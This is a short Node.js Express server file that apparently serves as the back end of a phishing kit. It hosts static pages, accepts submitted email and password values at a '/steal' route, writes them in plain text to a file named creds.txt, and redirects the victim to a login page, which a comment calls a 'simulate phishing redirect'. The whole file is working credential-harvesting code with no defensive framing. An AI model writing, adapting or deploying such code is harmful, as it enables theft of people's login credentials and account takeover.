// server.mjs or server.js if "type": "module" is in package.json

import express from "express";
import fs from "fs";
import path from "path";
import bodyParser from "body-parser";
import { fileURLToPath } from "url";
import { dirname } from "path";
import handler from "./api/steal.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

app.post("/steal", (req, res) => {
  const { email, password } = req.body;

  const log = `Email: ${email} | Password: ${password}\n`;
  fs.appendFile("creds.txt", log, (err) => {
    if (err) {
      console.error("Error writing to file:", err);
      return res.status(500).send("Error occurred.");
    }

    res.redirect("https://example.com/login"); // simulate phishing redirect
  });
});

app.listen(PORT, () => {
  console.log(`🚨 Server running at http://localhost:${PORT}`);
});
